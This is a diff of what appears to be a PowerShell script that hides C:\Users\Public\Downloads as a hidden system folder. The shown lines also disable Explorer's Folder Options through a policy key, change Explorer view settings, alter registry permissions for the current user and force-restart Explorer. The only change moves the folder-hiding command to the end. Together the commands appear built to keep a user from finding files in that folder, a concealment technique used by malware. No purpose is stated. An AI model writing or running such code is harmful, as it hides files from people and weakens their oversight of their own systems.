@@ -1,4 +1,3 @@
-attrib +h +s "C:\Users\Public\Downloads"
 New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" `
 -Name "NoFolderOptions" -PropertyType DWORD -Value 1 -Force
 New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" `
@@ -18,3 +17,4 @@ $rule2 = New-Object System.Security.AccessControl.RegistryAccessRule("$(whoami)"
 $acl2.AddAccessRule($rule2)
 Set-Acl $regPath2 $acl2
 Stop-Process -Name explorer -Force
+attrib +h +s "C:\Users\Public\Downloads"
